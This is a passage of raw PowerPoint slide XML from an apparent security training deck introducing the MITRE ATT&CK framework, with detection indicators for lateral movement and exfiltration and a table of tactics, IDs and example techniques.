          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lateral Movement Signatures:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> SMB connections from a workstation to multiple internal hosts in sequence indicate credential-driven lateral movement (T1021.002).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Large Outbound Transfers:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Sudden spikes in outbound data volume to external IPs, especially after hours, are a primary data exfiltration indicator (T1048).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Tactical Overview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MITRE ATT&amp;CK framework</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. It provides a common language for describing attacker behavior and measuring detection coverage.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Tactical Overview (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_mitre_attack_matrix.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="4373984"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="574398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Enterprise matrix: fourteen adversary tactics organized left-to-right in the order they typically occur during a campaign.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Tactical Overview (3/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Table 3"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="280556" y="1330000"/>
          <a:ext cx="10555354" cy="3976841"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638838"/>
                <a:gridCol w="2638840"/>
              </a:tblGrid>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Tactic</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>ID</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 Technique</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Reconnaissance</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0043</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Gathering information before attacking</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1595 Active Scanning</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Initial Access</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0001</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Entry point into the target environment</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1566 Phishing</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Execution</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0002</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Running malicious code</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1059 Command and Scripting Interpreter</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Persistence</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0003</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Maintaining foothold after reboot</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1547 Boot Autostart Execution</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Privilege Escalation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0004</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Gaining higher-level permissions</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1068 Exploitation for Privilege Escalation</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Defense Evasion</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0005</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Avoiding detection</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1055 Process Injection</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Credential Access</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0006</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Stealing credentials</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1003 OS Credential Dumping</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Discovery</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0007</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Exploring the environment</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1082 System Information Discovery</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Lateral Movement</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0008</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Moving to other systems</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1021 Remote Services</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Collection</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0009</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Gathering data of interest</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1074 Data Staged</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305910">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Exfiltration</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0010</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Stealing data</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1048 Exfiltration Over Alternative Protocol</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="305921">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
